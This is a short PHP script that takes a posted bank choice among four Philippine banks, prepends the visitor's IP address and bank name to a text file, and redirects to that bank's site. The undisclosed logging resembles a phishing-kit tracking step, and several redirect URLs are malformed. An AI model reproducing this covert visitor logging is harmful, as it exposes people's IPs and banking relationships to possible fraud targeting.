<?php
$today = date("H:i:s");
function file_prepend ($string, $filename) {
	
	$fileContent = file_get_contents ($filename);
	
	file_put_contents ($filename, $string . "\n" . $fileContent);
}
$ip = getenv("REMOTE_ADDR");
$bb = $_POST['bank'];
if ($bb == "bdo") {
	$replyMsg = " Logged [ $ip ] | Bank Name : Banco De Oro<br>";
	file_prepend($replyMsg, 'banks.txt');
	echo '<script type="text/javascript"> window.location = "www.online.bdo.com.ph?start&email=vic@fb.com"    </script>';
}else if ($bb == "bpi") {
	$replyMsg = " Logged [ $ip ] | Bank Name : Bank of the Philippine Islands<br>";
	file_prepend($replyMsg, 'banks.txt');
	echo '<script type="text/javascript"> window.location = "https://online.bpi.com.ph"    </script>';
}else if ($bb == "ubb") {
	$replyMsg = " Logged [ $ip ] | Bank Name : Unionbank Philippines<br>";
	file_prepend($replyMsg, 'banks.txt');
	echo '<script type="text/javascript"> window.location = "www.unionbank.com.ph/online"    </script>';
}else if ($bb == "landbank") {
	$replyMsg = " Logged [ $ip ] | Bank Name : LandBank Philippine<br>";
	file_prepend($replyMsg, 'banks.txt');
	echo '<script type="text/javascript"> window.location = "www.lbpiaccess.com"    </script>';
}else{
	echo '<script>alert("Invalid Bank")</script>';
}
?>
